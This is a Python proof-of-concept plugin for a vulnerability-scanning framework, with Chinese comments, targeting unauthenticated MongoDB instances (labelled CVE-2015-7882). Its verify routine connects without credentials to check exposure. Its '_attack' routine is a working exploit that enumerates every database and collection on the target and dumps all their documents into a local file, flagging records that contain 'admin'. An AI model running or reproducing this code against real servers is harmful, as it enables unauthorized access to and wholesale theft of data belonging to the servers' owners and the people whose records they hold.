#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import pymongo
from newpoc.api import PocBase, Output
from newpoc.cli import POC_QUEUE

class POC(PocBase):
    cnvd_cve = 'CVE-2015-7882'            # 漏洞编号
    version = '1'                           # 默认为1
    author = 'ganzhi'                       # PoC 作者名字
    vulDate = '2019-07-24'                  # 漏洞公开的时间
    createDate = '2021-08-28'               # 编写 PoC 的日期
    updateDate = '2021-08-29'               # PoC 更新的时间，默认和编写时间一样
    references = ["https://www.freebuf.com/vuls/212799.html"]                         # 漏洞地址来源
    name = 'MongoDB未授权访问漏洞'               # PoC 名称
    appPowerLink = 'https://www.mongodb.com/'      # 漏洞厂商主页地址
    appName = 'MongoDB'                       # 漏洞应用名称
    appVersion = '3.0.0-3.0.6'                # 漏洞影响版本
    vulType = 'Unauthorized Access'         # 漏洞类型
    desc = '''
        MongoDB服务安装后，默认未开启权限验证。如果服务监听在0.0.0.0，并且启动MongoDB服务时不添加任何参数，则可远程无需授权访问数据库
    '''  # 漏洞简要描述
    samples = ['192.168.1.23']  # 测试样列，就是用 PoC 测试成功的网站
    install_requires = ['pymongo']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = "pocs/MongDB/mongodb_poc.py"
    output = Output()

    def _verify(self, url):
        try:
            result = POC.parse_output()

            # 检测是否存在MongoDB未授权访问漏洞
            url = url['url']
            if url.startswith('https'):
                url = url.replace('https', 'mongodb')
            elif url.startswith('http'):
                url = url.replace('http', 'mongodb')
            elif url.startswith('mongodb://'):
                url = url
            else:
                url = "mongodb://" + url
            self.output.check(f'当前检测的目标服务器是{url}')
            my_client = pymongo.MongoClient(url)
            is_connected = self.db_connect(my_client)
            if is_connected:
                db_list = my_client.list_database_names()
            else:
                db_list = {}
            # 判断是否获取到admin数据库
            if "admin" in db_list:
                self.output.success(f'{url} is vulnerable')
                result['target-url'] = url
                result['payload'] = db_list
                POC_QUEUE.put(result)
                my_client.close()
            else:
                result = f'{url} is not vulnerable'
                self.output.fail(result)
            result = {'Stdout': result}
        except KeyboardInterrupt as keyerr:
            self.output.error("程序已退出")



    def _attack(self, payload):
        # 攻击代码，获取MongoDB里存在admin关键词的数据
        url = payload['url']
        if url.startswith('https'):
            url = url.replace('https', 'mongodb')
        elif url.startswith('http'):
            url = url.replace('http', 'mongodb')
        else:
            url = "mongodb://" + url
        my_client = pymongo.MongoClient(url)
        is_connected = self.db_connect(my_client)
        if is_connected:
            db_list = my_client.list_database_names()
            self.output.success(f'目标服务器MongoDB所有数据库{db_list}')
            for db_name in db_list:
                cols = my_client[db_name].list_collection_names()
                self.output.success(f'{db_name}数据库里的所有表名为{cols}')
                fo = open("mongodb_result.txt", "a")
                for col in cols:
                    datas = my_client[db_name][col].find()
                    fo.write(f'{db_name}库{col}表里的所有数据为:\n')
                    for data in datas:
                        fo.write(f'\t{data}\n')
                        if 'admin' in data.values():
                            self.output.success(f'{db_name}库{col}表的数据集里存在admin关键词: {data}')
                    fo.write("\n")
                fo.close()
            result = f'{url} 服务器获取数据完成，结果保存在mongodb_result.txt文件中'
        else:
            result = f'{url} 服务器获取数据失败'
        result = {'Stdout': result}
        return result
        # return self.parse_output(result)

    def _shell(self, url):
        pass

    def db_connect(self, my_client):
        # 判断MongoDB数据库是否连接成功
        try:
            if my_client.list_database_names():
                return True
        except:
            return False

    @staticmethod
    def parse_output():
        result = {
            "target-url": '',
            "poc-name": POC.name,
            "poc-id": POC.cnvd_cve,
            "component": POC.vulType,
            "version": POC.appVersion,
            "status": 'ok',
            "payload": ''
        }
        return result


